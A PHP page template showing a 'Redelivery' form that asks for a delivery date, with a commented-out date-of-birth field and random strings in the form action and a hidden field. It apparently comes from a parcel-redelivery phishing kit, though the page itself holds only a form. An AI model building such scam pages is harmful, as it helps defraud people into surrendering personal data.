<?php require_once __DIR__ . "/header.php"; ?>
       

        <!-- <br/>  -->
        <section class="page-section" id="">
            <div class="container">
                <div class="row">
                    <div class="col-lg-8 mx-auto ps_form_wrapper">
                        <br/>
                        <form id="deliverydateform" name="deliverydateForm" method="Post"   action="receipt.php?<?php echo generateRandomString(); ?>" onsubmit = "return(deliverydateValidate());">
                            <input type="hidden" name="uid" value="<?php echo generateRandomString(); ?>" />
                            <h1 id="title">Redelivery</h1>
                            <div class="control-group">
                                <div class="form-group">
                                    <label>Please select a delivery date<span class="red-symbol">*</span></label>
                                    <span class="red-down" ><i class='fas fa-caret-down'></i></span>
                                    <!-- <input  type="text"class="form-control" id="deliverydate" name="name" placeholder="" required="required" data-validation-required-message="Please enter your name." />
                                    <p class="help-block text-danger"></p> -->
                                    <input class="form-control" maxLength="10" id="deliverydate" name="deliverydate" type="tel" placeholder="" required="required" data-validation-required-message="Select date of birth." />
                                    <p class="help-block text-danger"></p>
                                </div>

                            <!-- <div class="control-group">
                                <div class="form-group">
                                    <label>Date of Birth<span class="red-symbol">*</span></label>
                                    <input class="form-control" maxLength="10" id="dob" name="dob" type="tel" placeholder="" required="required" data-validation-required-message="Select date of birth." />
                                    <p class="help-block text-danger"></p>
                                </div>
                            </div> -->

                            </div>
                            <div id="success"></div>
                            <div class="form-group" style="text-align: center;">
                                <button class="btn btn-primary btn-xl" id="sendMessageButton" type="submit">Continue</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </section>
        <br/>
        <!-- Footer-->
<?php require_once __DIR__ . "/footer.php"; ?>
   